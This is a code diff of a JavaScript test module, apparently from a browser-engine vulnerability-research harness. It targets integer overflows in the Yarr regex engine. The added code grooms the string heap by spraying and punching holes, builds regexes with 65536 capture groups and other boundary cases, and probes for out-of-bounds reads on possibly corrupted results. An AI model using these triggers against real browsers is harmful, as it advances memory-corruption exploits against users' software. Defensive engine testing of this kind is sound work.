@@ -1,8 +1,13 @@
+import { Groomer } from '../mod_groomer.js';
+
 export default {
     id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
     category: 'Boundary',
     risk:     'HIGH',
-    description: 'Foco exclusivo no Integer Overflow do Yarr C++ (Limites de 16-bits).',
+    description:
+        'Ataques ao parser/compilador Yarr sem causar ReDoS. ' +
+        'O JSString Heap é fragmentado antes da compilação para forçar ' +
+        'o compilador a usar rotas lentas de memória (causando o transbordo de 16-bits).',
 
     setup: function() {
         this.results = {};
@@ -10,28 +15,56 @@ export default {
     },
 
     trigger: function() {
-        // VETOR A: Transbordo do contador de grupos (0x10000 = 65536)
+
+        // 🚨 Grooming Massivo do JSString Heap:
+        // Poluímos a memória com strings pequenas e criamos buracos.
+        // O motor Yarr será forçado a tentar alocar o seu array num ambiente caótico.
+        let stringTrash = Groomer.sprayStrings(64, 5000);
+        Groomer.punchHoles(stringTrash, 3);
+
+        // A: Muitos grupos de captura (limite de 16-bits no Yarr antigo)
         try {
-            const groups = '(a)'.repeat(0x10000); 
+            const groups = '(a)'.repeat(0x10000); // 65536 grupos
             this.regexps.manyGroups = new RegExp(groups);
-            // Se o limite estourar, o C++ valida com apenas 1 caractere, 
-            // mas retorna um array de 65537 posições (OOB Read candidate)
             this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
         } catch(e) { this.results.manyGroupsErr = e.constructor.name; }
 
-        // VETOR B: Backreference além do limite de grupos do Yarr
+        // B: Backreference além do limite de grupos
         try {
             this.regexps.deepBackref = new RegExp('(a)\\65536');
             this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
         } catch(e) { this.results.deepBackrefErr = e.constructor.name; }
+
+        // C: Quantifier com valores near UINT32_MAX
+        try {
+            this.regexps.bigQuant = new RegExp('a{0,65535}');
+            this.results.bigQuantExec = this.regexps.bigQuant.exec('')?.length;
+        } catch(e) { this.results.bigQuantErr = e.constructor.name; }
+
+        // D: Alternation com muitos branches 
+        try {
+            const alts = Array.from({ length: 1000 }, (_, i) => `alt${i}`).join('|');
+            this.regexps.deepAlt = new RegExp(alts);
+            this.results.deepAltExec = this.regexps.deepAlt.exec('alt999') ? 'matched' : 'nomatch';
+        } catch(e) { this.results.deepAltErr = e.constructor.name; }
+
+        // E: Grupos nomeados duplicados 
+        try {
+            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
+            this.results.dupNamedExec = this.regexps.dupNamed.exec('a')?.groups;
+        } catch(e) { this.results.dupNamedErr = e.constructor.name; }
     },
 
     probe: [
-        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr, // Deve disparar Type Confusion (null -> 65537)
-        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr, // Deve disparar SyntaxError
-        
-        // Tentativa de leitura OOB (Out-Of-Bounds) no array corrompido
-        s => { try { return s.regexps.manyGroups?.exec('a')?.[50000]; } catch(e) { return e.constructor.name; } },
+        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr,
+        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr,
+        s => s.results.bigQuantExec     ?? s.results.bigQuantErr,
+        s => s.results.deepAltExec      ?? s.results.deepAltErr,
+        s => s.results.dupNamedExec     ?? s.results.dupNamedErr,
+
+        // Acesso ao índice máximo da memória possivelmente corrompida
+        s => { try { return s.regexps.manyGroups?.exec('a')?.[0xFFFF]; } catch(e) { return e.constructor.name; } },
+        s => { try { return s.regexps.dupNamed?.exec('b')?.groups?.name; } catch(e) { return e.constructor.name; } },
     ],
 
     cleanup: function() {
